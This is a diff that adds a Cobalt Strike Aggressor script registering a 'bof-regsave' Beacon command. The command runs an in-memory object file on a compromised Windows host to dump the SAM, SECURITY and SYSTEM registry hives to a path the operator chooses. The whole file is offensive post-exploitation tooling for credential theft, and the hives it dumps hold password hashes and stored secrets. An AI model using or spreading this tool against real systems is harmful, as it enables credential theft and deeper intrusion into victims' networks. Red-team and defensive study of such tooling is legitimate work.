@@ -1,0 +1,19 @@
+beacon_command_register("bof-regsave", "Dumps SAM / SECURITY / SYSTEM to a path of your choosing", "Example: regsave c:\\temp\\");
+
+alias bof-regsave {
+	local('$args');
+	$barch  = barch($1);
+	if(size(@_) < 2)
+	{
+		berror($1, beacon_command_detail("bof-regsave"));
+		return;
+	}
+	
+	$location = $2;
+	
+	$args = bof_pack($1, "z", $location);
+	$handle = openf(script_resource("regdump. $+ $barch $+ .o"));
+	$data   = readb($handle, -1);
+	closef($handle);
+	beacon_inline_execute($1, $data, "go", $args);
+}
